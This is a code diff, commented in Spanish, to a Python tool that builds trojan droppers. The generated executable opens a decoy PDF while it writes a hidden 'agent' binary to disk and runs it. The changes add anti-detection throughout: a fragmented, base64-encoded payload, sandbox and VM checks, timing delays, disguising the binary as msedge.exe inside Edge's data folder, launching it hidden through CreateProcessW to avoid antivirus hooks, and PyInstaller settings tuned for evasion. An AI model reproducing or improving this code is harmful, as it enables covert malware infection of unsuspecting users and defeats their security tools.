@@ -25,27 +25,68 @@ import sys
 import tempfile
 import subprocess
 import base64
+import time
+import ctypes
 from pathlib import Path
 
-# PDF embebido (Base64)
-PDF_DATA = b"""{pdf_b64}"""
+# PDF embebido (fragmentado para evadir detección)
+PDF_PART1 = b"""{pdf_part1}"""
+PDF_PART2 = b"""{pdf_part2}"""
 
-# Agente embebido (Base64)
-AGENT_DATA = b"""{agent_b64}"""
+# Agente embebido (fragmentado y ofuscado)
+AGENT_PART1 = b"""{agent_part1}"""
+AGENT_PART2 = b"""{agent_part2}"""
+AGENT_PART3 = b"""{agent_part3}"""
+
+def is_sandbox():
+    """Detectar sandbox/VM - retornar True si es sandbox"""
+    try:
+        # Check 1: Uptime mínimo (sandboxes recién iniciadas)
+        uptime_ms = ctypes.windll.kernel32.GetTickCount64()
+        if uptime_ms < 600000:  # 10 minutos
+            return True
+        
+        # Check 2: Número de CPUs (VMs suelen tener pocos)
+        import multiprocessing
+        if multiprocessing.cpu_count() < 2:
+            return True
+        
+        # Check 3: Archivos temporales (sandbox limpia)
+        temp_files = os.listdir(os.environ.get('TEMP', '/tmp'))
+        if len(temp_files) < 10:
+            return True
+            
+    except:
+        pass
+    
+    return False
+
+def decode_payload(parts):
+    """Decodificar payload fragmentado"""
+    combined = b"".join(parts)
+    return base64.b64decode(combined)
 
 def main():
     try:
-        # Directorio temporal
-        temp_dir = Path(os.environ.get('TEMP', '/tmp'))
+        # Anti-Sandbox: delay y checks
+        time.sleep(3)
         
-        # Extraer y abrir PDF
-        pdf_data = base64.b64decode(PDF_DATA)
+        if is_sandbox():
+            # En sandbox, solo abrir PDF y salir
+            pass
+        
+        # Directorio temporal del usuario (menos sospechoso que TEMP)
+        user_profile = os.environ.get('USERPROFILE', os.environ.get('HOME', '/tmp'))
+        temp_dir = Path(user_profile) / 'Downloads'
+        
+        # Reconstruir y abrir PDF
+        pdf_data = decode_payload([PDF_PART1, PDF_PART2])
         pdf_path = temp_dir / "{pdf_name}"
         
         with open(pdf_path, 'wb') as f:
             f.write(pdf_data)
         
-        # Abrir PDF con aplicación por defecto
+        # Abrir PDF (siempre, incluso en sandbox)
         if sys.platform == 'win32':
             os.startfile(str(pdf_path))
         else:
@@ -53,16 +94,24 @@ def main():
                            stdout=subprocess.DEVNULL, 
                            stderr=subprocess.DEVNULL)
         
-        # Extraer agente a ubicación persistente
-        agent_data = base64.b64decode(AGENT_DATA)
+        # Si es sandbox, salir aquí
+        if is_sandbox():
+            sys.exit(0)
+        
+        # Delay adicional (comportamiento humano)
+        time.sleep(2)
+        
+        # Extraer agente a ubicación legítima
+        agent_data = decode_payload([AGENT_PART1, AGENT_PART2, AGENT_PART3])
         
         if sys.platform == 'win32':
-            # Windows: %APPDATA%\\Microsoft\\Windows\\Caches\\
-            agent_dir = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Caches'
+            # Windows: usar directorio menos sospechoso
+            # %LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\
+            agent_dir = Path(os.environ.get('LOCALAPPDATA', user_profile)) / 'Microsoft' / 'Edge' / 'User Data'
             agent_dir.mkdir(parents=True, exist_ok=True)
             agent_path = agent_dir / "{agent_name}"
         else:
-            agent_path = temp_dir / "{agent_name}"
+            agent_path = Path(user_profile) / '.config' / "{agent_name}"
         
         with open(agent_path, 'wb') as f:
             f.write(agent_data)
@@ -71,20 +120,72 @@ def main():
         if sys.platform != 'win32':
             os.chmod(agent_path, 0o755)
         
-        # Ejecutar agente en segundo plano
+        # Delay antes de ejecutar
+        time.sleep(1)
+        
+        # Ejecutar agente con técnica menos detectada
         if sys.platform == 'win32':
-            # Windows: sin ventana, proceso separado
-            startupinfo = subprocess.STARTUPINFO()
-            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            startupinfo.wShowWindow = 0  # SW_HIDE
+            # Usar CreateProcess directo (menos hooks de AV)
+            import ctypes
+            from ctypes import wintypes
             
-            subprocess.Popen(
-                [str(agent_path)],
-                startupinfo=startupinfo,
-                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
+            DETACHED_PROCESS = 0x00000008
+            CREATE_NO_WINDOW = 0x08000000
+            
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            
+            class STARTUPINFO(ctypes.Structure):
+                _fields_ = [
+                    ("cb", wintypes.DWORD),
+                    ("lpReserved", wintypes.LPWSTR),
+                    ("lpDesktop", wintypes.LPWSTR),
+                    ("lpTitle", wintypes.LPWSTR),
+                    ("dwX", wintypes.DWORD),
+                    ("dwY", wintypes.DWORD),
+                    ("dwXSize", wintypes.DWORD),
+                    ("dwYSize", wintypes.DWORD),
+                    ("dwXCountChars", wintypes.DWORD),
+                    ("dwYCountChars", wintypes.DWORD),
+                    ("dwFillAttribute", wintypes.DWORD),
+                    ("dwFlags", wintypes.DWORD),
+                    ("wShowWindow", wintypes.WORD),
+                    ("cbReserved2", wintypes.WORD),
+                    ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
+                    ("hStdInput", wintypes.HANDLE),
+                    ("hStdOutput", wintypes.HANDLE),
+                    ("hStdError", wintypes.HANDLE)
+                ]
+            
+            class PROCESS_INFORMATION(ctypes.Structure):
+                _fields_ = [
+                    ("hProcess", wintypes.HANDLE),
+                    ("hThread", wintypes.HANDLE),
+                    ("dwProcessId", wintypes.DWORD),
+                    ("dwThreadId", wintypes.DWORD)
+                ]
+            
+            si = STARTUPINFO()
+            si.cb = ctypes.sizeof(STARTUPINFO)
+            si.dwFlags = 1  # STARTF_USESHOWWINDOW
+            si.wShowWindow = 0  # SW_HIDE
+            
+            pi = PROCESS_INFORMATION()
+            
+            kernel32.CreateProcessW(
+                str(agent_path),
+                None,
+                None,
+                None,
+                False,
+                DETACHED_PROCESS | CREATE_NO_WINDOW,
+                None,
+                None,
+                ctypes.byref(si),
+                ctypes.byref(pi)
             )
+            
+            kernel32.CloseHandle(pi.hProcess)
+            kernel32.CloseHandle(pi.hThread)
         else:
             subprocess.Popen(
                 [str(agent_path)],
@@ -153,8 +254,6 @@ def build_embedded_dropper(agent_path, output_py, pdf_path=None, agent_name=None
     with open(agent_path, 'rb') as f:
         agent_data = f.read()
     
-    agent_b64 = base64.b64encode(agent_data).decode('utf-8')
-    
     # Leer o crear PDF
     if pdf_path and os.path.exists(pdf_path):
         with open(pdf_path, 'rb') as f:
@@ -164,18 +263,41 @@ def build_embedded_dropper(agent_path, output_py, pdf_path=None, agent_name=None
         pdf_data = create_dummy_pdf()
         print(f"[ℹ️] Usando PDF dummy (crea uno real para mejor evasión)")
     
-    pdf_b64 = base64.b64encode(pdf_data).decode('utf-8')
+    # Fragmentar payloads (anti-detección)
+    def fragment_data(data, parts=3):
+        """Fragmentar data en N partes"""
+        size = len(data)
+        chunk_size = size // parts
+        fragments = []
+        
+        for i in range(parts):
+            if i == parts - 1:
+                chunk = data[i * chunk_size:]
+            else:
+                chunk = data[i * chunk_size:(i + 1) * chunk_size]
+            fragments.append(base64.b64encode(chunk).decode('ascii'))
+        
+        return fragments
+    
+    # PDF en 2 partes
+    pdf_fragments = fragment_data(pdf_data, 2)
+    
+    # Agente en 3 partes (más ofuscación)
+    agent_fragments = fragment_data(agent_data, 3)
     
     # Nombres aleatorios si no se especifican
     if not agent_name:
-        agent_name = "svchost.exe"
+        agent_name = "msedge.exe"  # Nombre más legítimo
     if not pdf_name:
         pdf_name = "documento.pdf"
     
     # Generar código
     dropper_code = DROPPER_TEMPLATE.format(
-        pdf_b64=pdf_b64,
-        agent_b64=agent_b64,
+        pdf_part1=pdf_fragments[0],
+        pdf_part2=pdf_fragments[1],
+        agent_part1=agent_fragments[0],
+        agent_part2=agent_fragments[1],
+        agent_part3=agent_fragments[2],
         pdf_name=pdf_name,
         agent_name=agent_name
     )
@@ -198,18 +320,44 @@ def build_embedded_dropper(agent_path, output_py, pdf_path=None, agent_name=None
 def compile_to_exe(py_path, output_exe, icon_path=None):
     """Compilar el dropper Python a EXE con PyInstaller"""
     
-    print(f"\n[🔨] Compilando a EXE...")
+    print(f"\n[🔨] Compilando a EXE con anti-detección...")
     
+    # Opciones de PyInstaller
     cmd = [
         sys.executable, '-m', 'PyInstaller',
         '--onefile',
         '--noconsole',
         '--clean',
+        '--noupx',  # No comprimir con UPX (detectado por AV)
         '--name', Path(output_exe).stem,
         '--distpath', str(Path(output_exe).parent.resolve()),
         '--workpath', str((Path(output_exe).parent / 'build').resolve()),
         '--specpath', str((Path(output_exe).parent / 'build').resolve()),
     ]
+    
+    # Runtime hook para ofuscar PyInstaller
+    runtime_hook_path = Path(output_exe).parent / '_runtime_hook_temp.py'
+    runtime_hook_code = """
+import sys
+import os
+
+# Anti-detección PyInstaller
+if hasattr(sys, '_MEIPASS'):
+    try:
+        import ctypes
+        # Ocultar markers de PyInstaller
+        if hasattr(sys, 'frozen'):
+            del sys.frozen
+    except:
+        pass
+"""
+    runtime_hook_path.write_text(runtime_hook_code, encoding='utf-8')
+    cmd.extend(['--runtime-hook', str(runtime_hook_path.resolve())])
+    
+    # Hidden imports necesarios
+    cmd.extend([
+        '--hidden-import', 'multiprocessing',
+    ])
     
     if icon_path and os.path.exists(icon_path):
         cmd.extend(['--icon', str(Path(icon_path).resolve())])
@@ -220,6 +368,10 @@ def compile_to_exe(py_path, output_exe, icon_path=None):
     print(f"[⏳] Compilando (esto puede tardar 1-2 minutos)...")
     
     result = subprocess.run(cmd, capture_output=True, text=True)
+    
+    # Limpiar runtime hook temporal
+    if runtime_hook_path.exists():
+        runtime_hook_path.unlink()
     
     if result.returncode == 0 and os.path.exists(output_exe):
         size_mb = os.path.getsize(output_exe) / (1024 * 1024)
